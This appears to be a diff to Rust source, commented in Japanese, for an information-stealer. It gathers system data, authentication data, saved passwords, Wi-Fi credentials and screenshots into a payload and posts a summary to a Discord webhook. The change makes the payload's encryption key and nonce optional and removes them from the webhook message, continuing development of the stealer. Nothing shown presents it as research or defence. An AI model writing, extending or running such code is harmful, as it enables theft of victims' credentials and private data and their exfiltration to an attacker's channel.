@@ -108,8 +108,11 @@ pub struct IntegratedPayload {
     pub input_statistics: InputStatistics,        // 入力統計情報（必須）
     pub timestamp: String,
     pub session_id: String,
-    pub encryption_key: String, // Base64エンコードされた暗号化キー（必須）
-    pub encryption_nonce: String, // Base64エンコードされたノンス（必須）
+    // 暗号化情報（オプション）
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub encryption_key: Option<String>, // Base64エンコードされたキー
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub encryption_nonce: Option<String>, // Base64エンコードされたナンス
 }
 
 #[cfg(windows)]
@@ -134,12 +137,6 @@ impl IntegratedPayload {
             (structured, stats)
         };
 
-        // 暗号化キーとノンス生成（必須）
-        let mut key = [0u8; 32];
-        let mut nonce = [0u8; 12];
-        getrandom::fill(&mut key).expect("Failed to generate random key");
-        getrandom::fill(&mut nonce).expect("Failed to generate random nonce");
-
         Ok(IntegratedPayload {
             system_info,
             auth_data,
@@ -148,23 +145,16 @@ impl IntegratedPayload {
             input_statistics,
             timestamp: chrono::Utc::now().to_rfc3339(),
             session_id: uuid::Uuid::new_v4().to_string(),
-            encryption_key: base64::Engine::encode(
-                &base64::engine::general_purpose::STANDARD,
-                &key,
-            ),
-            encryption_nonce: base64::Engine::encode(
-                &base64::engine::general_purpose::STANDARD,
-                &nonce,
-            ),
+            encryption_key: None,
+            encryption_nonce: None,
         })
     }
 
-    // キーとノンスを更新するメソッド（オプション）
+    /// 暗号化情報をペイロードに追加
     pub fn update_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
-        self.encryption_key =
-            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, key);
-        self.encryption_nonce =
-            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce);
+        use crate::utils::crypto::encode_base64;
+        self.encryption_key = Some(encode_base64(key));
+        self.encryption_nonce = Some(encode_base64(nonce));
     }
 }
 
@@ -237,14 +227,6 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> A
                     password_count,
                     wifi_count,
                     screenshot_count
-                ),
-                "inline": false
-            },
-            {
-                "name": "🔐 暗号化情報",
-                "value": format!("**キー**: {}\n**ノンス**: {}",
-                    payload.encryption_key,
-                    payload.encryption_nonce
                 ),
                 "inline": false
             }
